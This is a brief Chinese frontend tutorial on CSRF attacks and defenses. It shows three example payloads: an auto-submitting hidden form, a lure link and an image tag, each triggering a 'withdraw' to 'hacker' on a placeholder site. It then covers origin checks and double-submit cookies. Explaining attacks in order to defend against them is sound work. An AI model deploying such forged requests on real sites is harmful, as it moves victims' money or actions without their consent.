# 前端 | CSRF 的攻击类型与防御

XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。

### POST 类型的 CSRF

```html
<form action="http://a.com/withdraw" method="POST">
  <input type="hidden" name="account" value="airing" />
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="for" value="hacker" />
</form>
<script>
  document.forms[0].submit()
</script>
```

### 链接类型的 CSRF

```html
<a href="http://a.com/withdraw.php?amount=1000&for=hacker" taget="_blank">
  屠龙宝刀，点击就送！
  <a
/></a>
```

### GET 类型的 CSRF

```html
<img src="http://a.com/withdraw?amount=10000&for=hacker" />
```

## CSRF 的防御方法

### 2.1.1 同源检测

- Origin Header
- Referer Header

### 双重 Cookie 验证

在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串。
在前端向后端发起请求时，取出 Cookie，并添加到 URL 的参数中。
后端接口验证 Cookie 中的字段与 URL 参数中的字段是否一致，不一致则拒绝。

## links

- [前端 | CSRF 的攻击类型与防御](https://zhuanlan.zhihu.com/p/61827277)
